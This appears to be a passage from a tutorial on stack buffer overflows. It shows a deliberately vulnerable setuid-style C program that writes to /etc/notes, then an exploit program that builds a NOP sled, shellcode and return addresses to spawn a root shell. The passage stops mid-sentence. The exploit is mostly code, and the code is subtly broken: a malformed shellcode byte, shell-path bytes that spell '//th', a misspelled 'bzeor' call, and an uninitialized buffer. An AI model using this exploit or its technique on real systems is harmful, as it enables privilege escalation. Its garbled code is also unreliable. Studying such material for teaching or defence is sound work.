```c
/* 
 * This program will be sacrificed for project
 * programe name: victim
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>

int main(int argc, char* argv[]) {
  char* buffer;
  int fd;
  
  if(argc != 2)
  {
    printf("Usage: %s <message>\n", argv[0]);
    exit(0);
  }
  
  fd = open("/etc/notes", O_CREAT|O_RDWR|O_APPEND, S_IRUSR|S_IWUSR);
  if(fd == -1)
    perror("in main open()");
    
  strcpy(buffer, argv[1]);  // vulnerable point!

  write(fd, buffer, sizeof(buffer));
  printf("%s\n", buffer);
  
  return 0;
}
```
Here, the owner of /etc/notes is root. So this program should be executed with root privilege.

```c
/*
 * exploit program
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] =
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x74\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\80";

int main(int argc, char* argv[]) {
  char* command, *buffer;
  unsigned long i, ret, offset = 0;
  
  if(argc > 1)
    offset = (unsigned long)atoi(argv[1]);
    
  command = (char*)malloc(300);
  bzeor(command, 300);
  
  strcpy(command, "./victim \'");
  buffer = command + strlen(command);
  
  ret = (unsigned long)(&i - offset);
  
  for(i = 0; i < 268; i += 8)
    *((unsigned long*)(buffer + i)) = ret;
  
  memset(buffer, 0x90, 60);
  memcpy(buffer + 60, shellcode, sizeof(shellcode) - 1);
  strcat(command, "\'");
  
  system(command);
  free(command);
}
```

First step of this exploit is make string which contains    
>./victim 'nopsled + shellcode + address of somewhere of nopsled'   
and store it in command. But 
